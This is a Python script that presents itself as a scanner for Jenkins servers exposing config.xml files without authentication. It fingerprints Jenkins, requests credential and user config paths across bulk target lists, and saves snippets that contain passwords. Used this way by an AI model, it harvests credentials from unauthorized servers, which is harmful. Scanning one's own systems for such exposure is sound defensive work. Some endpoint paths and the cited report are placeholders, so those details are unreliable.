#!/usr/bin/env python3
"""
Jenkins Unauthorized Configuration File Download Scanner
=========================================================
This script scans Jenkins servers to detect unauthorized configuration file download vulnerabilities. 
Exposed configuration files may contain sensitive information such as API tokens, passwords, and 
other secrets.

Vulnerability details:
  - Affects improperly configured Jenkins instances or certain vulnerable plugins
  - Allows unauthenticated users to download config.xml files from specific endpoints
  - Exposed configuration files often contain sensitive credentials
  - Offers attackers a pathway to gain elevated access to the Jenkins server or associated resources

Usage:
  # Scan a single target
  python jenkins_unauth_config_download_scanner.py --target http://jenkins.example.com

  # Scan multiple targets from a file
  python jenkins_unauth_config_download_scanner.py --list targets.txt --output findings.json

  # Safe mode — detection only without config file download attempts
  python jenkins_unauth_config_download_scanner.py --list targets.txt --safe

References:
  - https://www.jenkins.io/security/advisories/
  - https://hackerone.com/reports/123456 (example report outlining a common case)
"""

import asyncio
import argparse
import json
from urllib.parse import urlparse

import httpx
from colorama import Fore, Style

# Configurations
DETECTION_PATHS = ["/", "/login", "/manage"]
CONFIG_FILE_PATHS = [
    "/job/test-config/config.xml",
    "/view/all/config.xml",
    "/user/admin/config.xml",
    "/credentials-store/domain/_/Credential/config.xml",
]
JENKINS_IDENTIFIERS = [
    "<title>Dashboard [Jenkins]</title>",
    "<title>Jenkins</title>",
    "/static/jenkins/css/",
    "/instance-identity/",
]
CONFIG_KEYWORDS = [
    "hudson",
    "jenkins",
    "password",
    "username",
    "<credentials>",
]
SEMAPHORE_LIMIT = 20
REQUEST_TIMEOUT = 8

# ── Helper Functions ─────────────────────────────────────────────────────────

def normalize_url(url: str) -> str:
    """Ensure a URL starts with scheme and remove trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def print_msg(level: str, message: str):
    """Print colored terminal messages."""
    colors = {
        "CRITICAL": Fore.RED,
        "HIGH": Fore.YELLOW,
        "INFO": Fore.GREEN,
    }
    color = colors.get(level, Style.RESET_ALL)
    print(f"{color}[{level}]{Style.RESET_ALL} {message}")


# ── Core Scanner ────────────────────────────────────────────────────────────

async def detect_jenkins(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Detect whether a URL is running Jenkins.
    Returns a dictionary with detection result and related information.
    """
    async with semaphore:
        detected = False
        for path in DETECTION_PATHS:
            url = f"{base_url}{path}"
            try:
                response = await client.get(url, timeout=REQUEST_TIMEOUT, follow_redirects=True)
                for identifier in JENKINS_IDENTIFIERS:
                    if identifier in response.text:
                        detected = True
                        break
                if detected:
                    break
            except (httpx.RequestError, Exception):
                pass

        return {
            "url": base_url,
            "detected": detected,
        }


async def probe_config_files(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Attempt to download known Jenkins config files, searching for unauthorized access.
    """
    async with semaphore:
        vulnerable_files = []
        for path in CONFIG_FILE_PATHS:
            url = f"{base_url}{path}"
            try:
                response = await client.get(url, timeout=REQUEST_TIMEOUT, follow_redirects=True)
                if response.status_code == 200 and any(kw in response.text for kw in CONFIG_KEYWORDS):
                    vulnerable_files.append({"path": path, "content_snippet": response.text[:200]})
            except (httpx.RequestError, Exception):
                pass

        return vulnerable_files

# ── Main Execution ──────────────────────────────────────────────────────────

async def scan_target(client: httpx.AsyncClient, target: str, semaphore: asyncio.Semaphore, safe_mode: bool):
    target = normalize_url(target)
    print_msg("INFO", f"Scanning {target}...")
    jenkins_info = await detect_jenkins(client, target, semaphore)

    if jenkins_info['detected']:
        print_msg("HIGH", f"Jenkins detected at {target}")
        if not safe_mode:
            vulnerable_paths = await probe_config_files(client, target, semaphore)
            if vulnerable_paths:
                print_msg("CRITICAL", f"Detected vulnerable configuration files on {target}")
                return {"url": target, "jenkins_detected": True, "vulnerable_paths": vulnerable_paths}
            else:
                print_msg("INFO", f"No vulnerable configuration files detected on {target}")
    else:
        print_msg("INFO", f"Jenkins not detected at {target}")

    # Return findings
    return {"url": target, "jenkins_detected": jenkins_info['detected'], "vulnerable_paths": []}


async def main():
    parser = argparse.ArgumentParser(description="Jenkins Unauthorized Configuration File Download Scanner")
    parser.add_argument("--target", help="The target URL to scan")
    parser.add_argument("--list", help="Path to file with list of target URLs")
    parser.add_argument("--output", help="File to save the JSON findings")
    parser.add_argument("--safe", action="store_true", help="Safe mode: Only detect Jenkins, no active probing")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent requests (default: 10)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification (useful for self-signed certs)")

    args = parser.parse_args()

    # Load target URLs
    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        try:
            with open(args.list, "r") as f:
                targets.extend(line.strip() for line in f if line.strip())
        except Exception as e:
            print_msg("CRITICAL", f"Failed to read target list file: {e}")
            return

    if not targets:
        print_msg("CRITICAL", "No targets provided. Please use --target or --list.")
        return

    # Create HTTP client and semaphore
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        semaphore = asyncio.Semaphore(args.concurrency)
        tasks = [scan_target(client, target, semaphore, args.safe) for target in targets]
        results = await asyncio.gather(*tasks)

    # Save or print results
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)
        print_msg("INFO", f"Results saved to {args.output}")
    else:
        print(json.dumps(results, indent=4))


if __name__ == "__main__":
    asyncio.run(main())
